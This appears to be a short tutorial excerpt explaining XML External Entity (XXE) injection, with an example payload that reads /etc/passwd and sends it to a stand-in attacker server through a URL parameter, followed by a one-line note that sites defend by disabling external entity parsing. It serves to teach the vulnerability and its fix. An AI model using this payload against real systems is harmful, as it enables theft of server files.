# XML External Entity Vulnerability
```(xml)
    <?xml version="1.1" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
    <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
    ]
    >
    <foo>&callhome;</foo>
```
The `%` is used when the entity is to be
evaluated within the XML DTD definition itself and the `&` when the entity is evaluated in
the XML document. When the XML document is parsed, the `callhome !ENTITY` will
read the contents of the `/etc/passwd` file and make a remote call to `www.malicous.com`
sending the file contents as a URL parameter. Since we own that server, we can check
our logs and get the contents of `/etc/passwd`.
So, how do sites protect them against XXE vulnerabilities? They disable the parsing of
external entities.
